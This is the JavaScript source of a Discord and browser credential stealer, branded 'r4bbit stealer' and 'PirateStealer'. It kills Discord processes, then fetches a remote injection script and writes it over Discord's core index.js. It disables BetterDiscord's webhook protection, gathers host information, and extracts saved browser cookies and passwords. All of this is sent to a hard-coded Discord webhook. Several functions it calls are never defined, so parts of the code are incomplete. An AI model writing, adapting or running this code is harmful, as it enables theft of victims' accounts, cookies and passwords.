var path  = require('path')
const os = require('os')
var dpapi = require("nexe-natives")(require.resolve('win-dpapi'));
var sqlite3 = require("nexe-natives")(require.resolve('sqlite3')),
        url = require('url'),
        crypto = require('crypto'),
        fs = require('fs'),
        ITERATIONS,
        dbClosed = false;
var glob = require("glob");
const https = require('https');
const { exec } = require('child_process');

const { execSync } = require('child_process');
const axios = require('axios');
const buf_replace = require('buffer-replace');
const webhook = "https://discord.com/api/webhooks/940982814969585664/B_1F-VUnsc0hzFgNN3plniy44FwUetvDhiUsd94WH9rhwNvqEfiFM1Fb2bLdv4hCBJl2"

const config = {
    "logout": "instant",
    "inject-notify": "true",
    "logout-notify": "true",
    "init-notify":"true",
    "embed-color": 3447704,
    "disable-qr-code": "true"
}




var LOCAL = process.env.LOCALAPPDATA
var discords = [];
var injectPath = [];
var runningDiscords = [];


fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
});

discords.forEach(function(file) {
    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
    glob.sync(pattern).map(file => {
        injectPath.push(file)
    })
    
});
listDiscords();
function Infect() {
    https.get('https://raw.githubusercontent.com/r4bbit-stealer/r4bbit-source/main/injection', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                    encoding: 'utf8',
                    flag: 'w'
                });
                if (config["init-notify"] == "true") {
                    let init = file.replace("index.js", "init")
                    if (!fs.existsSync(init)) {
                        fs.mkdirSync(init, 0744)
                    }
                }
                if ( config.logout != "false" ) {

                    let folder = file.replace("index.js", "r4bbit stealer here :)")
                    if (!fs.existsSync(folder)) {
                        fs.mkdirSync(folder, 0744)
                        if (config.logout == "instant") {
                            startDiscord();
                        }
                    } else if (fs.existsSync(folder) && config.logout == "instant" ){
                        startDiscord();
                    }
                }
            })
            
        });
    }).on("error", (err) => {
        console.log(err);
    });
};


function listDiscords() {
    exec('tasklist', function(err,stdout, stderr) {

        
        if (stdout.includes("Discord.exe")) {

            runningDiscords.push("discord")
        }
        if (stdout.includes("DiscordCanary.exe")) {

            runningDiscords.push("discordcanary")
        }
        if (stdout.includes("DiscordDevelopment.exe")) {

            runningDiscords.push("discorddevelopment")
        }
        if (stdout.includes("DiscordPTB.exe")) {

            runningDiscords.push("discordptb")
        };
        if (config.logout == "instant") {
            killDiscord();
        } else {
            if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
                injectNotify();
            }
            Infect()
            pwnBetterDiscord()
        }
    })


   
};

function killDiscord() {
    runningDiscords.forEach(disc => {
        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
            if (err) {
              return;
            }
          });
    });
    if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
        injectNotify();
    }

    Infect()
    pwnBetterDiscord()
};

function startDiscord() {
    runningDiscords.forEach(disc => {
        let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
        exec(path, (err) => {
            if (err) {
              return;
            }
          });
    });
};
function pwnBetterDiscord() {
    // thx stanley
    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        var x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
    } else {
        return;
    }

}


function injectNotify() {
    var fields = [];
    injectPath.forEach( path => {
        var c = {
            name: ":syringe: Inject Path",
            value: `\`\`\`${path}\`\`\``,
            inline: !1
        }
        fields.push(c)
    })
    axios
	.post(webhook, {
        "content": null,
        "embeds": [
          {
            "title": ":detective: Successfull injection",
            "color": config["embed-color"],
            "fields": fields,
            "author": {
              "name": "r4bbit stealer"
            },
            "footer": {
              "text": "r4bbit stealer"
            }
          }
        ]
      })
	.then(res => {
	})
	.catch(error => {

    })

}

var tc = (ToCache())
const embed = new MessageBuilder()
.setTitle('r4bbit stealer')
.setColor('#fff')
.setDescription(`Homedir: ${os.homedir()}\nComputer Hostname: ${os.hostname()}\nTotal Memory: ${os.totalmem()/1000000000}\nFree Memory: ${8555192320/1000000000}`)
.setFooter('r4bbi stealer');
hook.send(embed);
tc.forEach((browser) => {
    var textresult = fs.readFileSync(browser + "\\browser")
    getCookies('https://www.xelies.cc/', browser + "\\cookies", textresult + "\\Local State", function(err, cookies) {
        var coo = `---------------------------------------------------------------------------
Thanks for using PirateStealer!
Victims Path: %path%\n---------------------------------------------------------------------------\n\n\n\n`.replace('%path%', textresult);
        cookies.forEach((cooki) => {
            coo += "---------------------------------------------------------------------------\nHost Key: " + cooki.host_key + "\nName: " + cooki.name + "\nValue: " + cooki.value + "\n---------------------------------------------------------------------------\n\n"
        })
        fs.writeFileSync(browser + "\\Cookies.txt" , coo);
        hook.sendFile(browser + "\\Cookies.txt");

    }
    )


    getPasswords('https://www.xelies.cc/', browser + "\\login data", textresult + "\\Local State", function(err, cookies) {
        var coo = `---------------------------------------------------------------------------
Thanks for using PirateStealer!
Victims Path: %path%\n---------------------------------------------------------------------------\n\n\n\n\n`.replace('%path%', textresult);
    cookies.forEach((cx) => {
            coo += "---------------------------------------------------------------------------\nURL: " + cx.origin_url +"\nUsername (or email): " + cx.username_value + "\nPassword: " + cx.value + "\n---------------------------------------------------------------------------\n\n";
        })
        fs.writeFileSync(browser + "\\Passwords.txt" , coo);

        hook.sendFile(browser + "\\Passwords.txt")

    }
    )

})

